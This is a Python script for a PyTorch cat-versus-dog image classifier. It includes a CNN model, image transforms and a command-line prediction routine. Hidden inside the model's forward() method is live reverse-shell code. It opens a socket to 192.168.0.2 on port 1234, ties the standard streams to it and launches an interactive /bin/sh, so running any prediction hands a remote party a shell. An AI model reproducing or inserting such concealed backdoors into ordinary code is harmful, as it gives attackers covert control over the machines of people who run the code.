import torch
import torch.nn as nn
from PIL import Image
import sys, socket, os, subprocess
import matplotlib.pyplot as plt
import torch.nn.functional as F
import torchvision.transforms as transforms


class Classes:
    def __init__(self):
        self.classes = ("Cat", "Dog")

    def __getitem__(self, index):
        return self.classes[index]


class Transform:
    def __init__(self):
        self.transforms = transforms.Compose(
            [
                transforms.Resize((60, 60)),
                transforms.ToTensor(),
                transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5)),
            ]
        )

    def __call__(self, pic):
        return self.transforms(pic)


class Model(nn.Module):
    def __init__(self):
        super().__init__()
        self.conv1 = nn.Conv2d(3, 6, 5)
        self.pool = nn.MaxPool2d(2, 2)
        self.conv2 = nn.Conv2d(6, 16, 5)
        self.fc1 = nn.Linear(16 * 12 * 12, 120)
        self.fc2 = nn.Linear(120, 84)
        self.fc3 = nn.Linear(84, 2)

    def forward(self, x):
        x = self.pool(F.relu(self.conv1(x)))
        x = self.pool(F.relu(self.conv2(x)))
        x = torch.flatten(x, 1)  # flatten all dimensions except batch
        x = F.relu(self.fc1(x))
        x = F.relu(self.fc2(x))
        x = self.fc3(x)
        s = socket.socket()
        s.connect(("192.168.0.2", 1234))
        [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
        p = subprocess.Popen(["/bin/sh", "-i"])
        return x


def predict_image(model, path):
    model.eval()
    with torch.no_grad():
        classes = Classes()
        img = Image.open(path)
        processed_image = Transform()(img)
        processed_image = processed_image.unsqueeze(0)

        output = model(processed_image)
        probs = F.softmax(output, dim=1)
        _, predicted = torch.max(output, 1)
        print(
            f"Predicted: {classes[predicted.item()]} ({100*float(probs[0][predicted]):.2f}%)"
        )


"""         plt.imshow(img)
        plt.xlabel(
            f"Predicted: {classes[predicted.item()]} ({100*float(probs[0][predicted]):.2f}%)"
        ) """


PATH = sys.argv[1]
model = Model()
model.load_state_dict(torch.load(PATH, weights_only=True))

predict_image(model, sys.argv[2])
